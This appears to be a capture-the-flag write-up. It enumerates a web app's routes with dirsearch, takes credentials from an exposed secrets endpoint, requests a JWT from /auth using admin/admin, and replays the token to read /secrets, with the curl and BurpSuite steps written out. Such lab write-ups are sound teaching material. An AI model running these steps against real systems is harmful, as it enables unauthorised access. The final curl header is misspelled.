## authorization

```
cd dirsearch
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Run dirsearch:

```
python dirsearch.py -u <url> -w db/dicc.txt
```

We get the following routes:

```
/auth
/client_secrets.json
/console
/robots.txt
/secrets
```
For `auth` endpoint, we are not allowed to use GET requests; after trying a BurpSuite POST request, we see some errors involving `JWT_AUTH_USERNAME_KEY` and `JWT_AUTH_PASSWORD_KEY`. We get credentials from `/secret` and modify our request in BurpSuite by adding:

```
Content-Type: application/json

{
    "username":"admin",
    "password":"admin"
}
```

Or use the curl command:

```
curl -s <url>/auth -H "Content-Type: application/json" --data '{"username":"admin","password":"admin"}'
```

This way, we get the JWT_AUTH token, which we can use in our request to get the flag.

In BurpSuite, add:

```
Authorization: JWT <token>
```

Alternatively, curl:

```
curl -s <url>/secrets -H "Content-Type: application/json" -H "Authorizarion: JWT <token>"
```

